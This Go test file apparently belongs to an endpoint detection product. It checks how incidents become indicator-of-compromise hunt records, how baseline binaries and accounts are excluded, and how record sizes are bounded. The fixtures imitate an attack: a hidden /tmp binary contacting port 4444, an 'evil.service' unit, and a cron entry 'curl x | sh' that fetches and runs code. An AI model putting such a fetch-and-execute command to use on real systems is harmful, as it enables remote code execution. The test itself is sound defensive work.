package hunt

import (
	"net/netip"
	"strings"
	"testing"
	"time"

	"xdr/internal/incident"
)

var t0 = time.Date(2026, 11, 11, 12, 0, 0, 0, time.UTC)

const sum = "ab12000000000000000000000000000000000000000000000000000000000000"

func egressKill() incident.Incident {
	return incident.Incident{
		Time: t0, Host: "web01", Kind: "egress", Action: "killed", Exe: "/tmp/.x", SHA256: sum, Size: 1234, User: "www-data",
		Remote: &incident.Endpoint{Addr: "203.0.113.9", Port: 4444, Proto: "tcp"},
	}
}

var none = Base{Exe: func(string, string) bool { return false }, User: func(string) bool { return false }}

func TestFromIncident_Indicators(t *testing.T) {
	r := FromIncident(egressKill(), none)
	if r == nil || r.From != "web01" || !r.Time.Equal(t0) {
		t.Fatalf("%+v", r)
	}
	if len(r.IOC.Files) != 1 || r.IOC.Files[0] != (File{SHA256: sum, Size: 1234, Path: "/tmp/.x"}) {
		t.Errorf("files %+v", r.IOC.Files)
	}
	if len(r.IOC.Remotes) != 1 || r.IOC.Remotes[0] != (Remote{netip.MustParseAddr("203.0.113.9"), 4444, "tcp"}) {
		t.Errorf("remotes %+v", r.IOC.Remotes)
	}
	if len(r.IOC.Users) != 1 || r.IOC.Users[0] != "www-data" {
		t.Errorf("users %+v", r.IOC.Users)
	}
	if r.ID != FromIncident(egressKill(), none).ID || len(r.ID) != 16 || r.ID != ID(r.IOC) {
		t.Errorf("id %q", r.ID)
	}
	in := egressKill()
	in.Origin, in.OriginSHA256, in.Cron = "unit:evil.service", sum, "curl x | sh"
	r = FromIncident(in, none)
	if len(r.IOC.Units) != 1 || r.IOC.Units[0] != "evil.service@"+sum || len(r.IOC.Cron) != 1 || r.IOC.Cron[0] != "curl x | sh" {
		t.Errorf("unit, cron %+v", r.IOC)
	}
	for name, edit := range map[string]func(*incident.Incident){
		"listener": func(in *incident.Incident) { in.Kind = "listener" },
		"alert":    func(in *incident.Incident) { in.Action = "alert" },
	} {
		in := egressKill()
		edit(&in)
		if r := FromIncident(in, none); r != nil {
			t.Errorf("%s: %+v", name, r)
		}
	}
}

// A base-image binary, a stock unit and a stock account are on every box:
// hunting them would flag the whole fleet.
func TestFromIncident_BaselineNotHunted(t *testing.T) {
	in := egressKill()
	in.Exe, in.Origin, in.OriginSHA256 = "/usr/bin/python3.12", "unit:cron.service", ""
	base := Base{
		Exe:  func(p, s string) bool { return p == "/usr/bin/python3.12" && s == sum },
		User: func(u string) bool { return u == "www-data" },
	}
	r := FromIncident(in, base)
	if r == nil || len(r.IOC.Files) != 0 || len(r.IOC.Units) != 0 || len(r.IOC.Users) != 0 || len(r.IOC.Remotes) != 1 {
		t.Fatalf("%+v", r)
	}
	in.Remote = nil
	if r := FromIncident(in, base); r != nil {
		t.Fatalf("empty ioc: %+v", r)
	}
}

func TestBound(t *testing.T) {
	long := strings.Repeat("a", 513)
	for name, c := range map[string]struct {
		edit func(*IOC)
		want string
	}{
		"ok":          {func(*IOC) {}, ""},
		"files":       {func(i *IOC) { i.Files = make([]File, 65); fill(i.Files) }, "files"},
		"path":        {func(i *IOC) { i.Files[0].Path = "/" + long }, "files"},
		"sha":         {func(i *IOC) { i.Files[0].SHA256 = strings.ToUpper(sum) }, "files"},
		"size":        {func(i *IOC) { i.Files[0].Size = -1 }, "files"},
		"remotes":     {func(i *IOC) { i.Remotes = make([]Remote, 65) }, "remotes"},
		"remote addr": {func(i *IOC) { i.Remotes[0].Addr = netip.Addr{} }, "remotes"},
		"remote port": {func(i *IOC) { i.Remotes[0].Port = 0 }, "remotes"},
		"proto":       {func(i *IOC) { i.Remotes[0].Proto = "icmp" }, "remotes"},
		"units":       {func(i *IOC) { i.Units = []string{long} }, "units"},
		"cron":        {func(i *IOC) { i.Cron = make([]string, 65) }, "cron"},
		"users":       {func(i *IOC) { i.Users = []string{long} }, "users"},
	} {
		r := FromIncident(egressKill(), none)
		c.edit(&r.IOC)
		r.ID = ID(r.IOC)
		err := r.Bound()
		switch {
		case c.want == "" && err != nil:
			t.Errorf("%s: %v", name, err)
		case c.want != "" && (err == nil || !strings.Contains(err.Error(), c.want)):
			t.Errorf("%s: got %v, want %q", name, err, c.want)
		}
	}
	r := FromIncident(egressKill(), none)
	r.ID = "0123456789abcdef"
	if err := r.Bound(); err == nil || !strings.Contains(err.Error(), "id") {
		t.Errorf("tampered id: %v", err)
	}
	r = FromIncident(egressKill(), none)
	r.From = long
	if err := r.Bound(); err == nil || !strings.Contains(err.Error(), "from") {
		t.Errorf("long from: %v", err)
	}
}

func fill(fs []File) {
	for i := range fs {
		fs[i] = File{SHA256: sum, Size: int64(i)}
	}
}
